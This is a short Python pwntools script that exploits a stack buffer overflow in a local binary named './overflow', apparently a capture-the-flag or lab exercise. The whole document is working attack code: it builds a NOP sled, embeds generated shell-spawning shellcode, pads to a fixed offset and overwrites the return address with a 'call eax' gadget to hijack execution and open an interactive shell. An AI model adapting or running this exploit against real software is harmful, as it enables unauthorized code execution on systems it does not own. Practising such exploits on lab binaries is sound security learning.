from pwn import *
context(os='linux', arch='i386')
context.log_level = 'debug'
TARGET = './overflow'
OFFSET = 316
proc = process(TARGET)
out = proc.read()
#pause()
EAX_ADD = 0x8049019
# creating payload with nop-sled
payload = b'\x90'*10
# Generating shell code and having in the payload
payload += asm(shellcraft.sh())
payload += b'\x90'*(OFFSET - len(payload))
# For ret2reg style attack:
# Find the address of CALL_EAX address using:
# objdump -D overflow | grep call | grep eax
payload += p32(EAX_ADD)
# writing the payload to the target binary
proc.writeline(payload)
# to open up interactive shell on the shell
out = proc.interactive()
print(out)
